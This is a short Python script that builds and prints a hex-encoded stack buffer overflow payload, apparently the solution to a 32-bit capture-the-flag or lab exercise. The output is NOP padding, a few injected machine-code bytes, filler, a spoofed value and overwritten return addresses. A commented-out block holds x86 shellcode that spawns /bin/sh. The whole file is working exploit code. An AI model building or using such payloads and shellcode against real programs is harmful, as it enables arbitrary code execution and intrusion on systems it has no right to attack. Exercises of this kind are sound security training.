upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in upper:
    if i == 'V':
        # 0x62f99261
        print("6192f962",end="")
        continue
    if i < "M":
        print("90"*4, end="")
        continue

    if i > "M" and i < "P":
       continue

    #if i == "H":
        #print("31c05068", end="")
        #print("2f2f7368", end="")
        #print("682f6269", end="")
        #print("6e89e389", end="")
        #print("c189c2b0", end="")
        #print("0bcd8031", end="")
        #print("c040cd80", end="")
        #print("c3909090", end="")
        #continue

    if i == "M":
        print("c7406c2b", end="")
        print("fb6990c3", end="")
        print("90909090", end="")
        continue

    if i != 'P' and i != 'T':
        print(str(hex(ord(i)))[2:]*4 ,end="")
    elif i == 'T':
        # Return Address
        # 0xffffccfc
        # 0x08049683
        print("f1960408", end="")
        print("a0ccffff",end="")
        print("83960408",end="")
    else:
        # 0x30307761
        print("61773030",end="")

